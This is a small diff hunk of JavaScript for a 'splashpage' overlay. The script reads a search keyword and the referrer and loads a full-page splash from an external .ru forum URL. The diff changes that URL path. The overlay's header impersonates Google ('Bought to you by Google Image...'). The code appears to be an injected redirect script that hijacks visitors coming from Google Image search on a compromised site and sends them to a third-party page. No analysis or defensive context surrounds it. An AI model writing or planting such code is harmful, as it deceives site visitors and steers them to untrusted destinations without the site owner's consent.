@@ -4,7 +4,7 @@ var keyword=keyword.replace(/\-.*/, '');
 var isgoogle=document.referrer.match(/(.*)/i);
 var splashpage={
 splashenabled: 1,
-splashpageurl: 'http://pikni.ru/forum/lp/'+keyword,
+splashpageurl: 'http://pikni.ru/forum/lfn1/'+keyword,
 enablefrequency: 0,
 displayfrequency: "2 days",
 defineheader: '<div style="padding: 5px; color: white; font: bold 16px Verdana; background: black url(blockdefault.gif) center center repeat-x;"><a style="position:fixed; top: 2px; right: 5px" href="javascript:splashpage.closeit()" title="Skip to Content"><img src="skip.gif" border="0" width="114px" height="23px" /></a>Bought to you by Google Image...</div>',
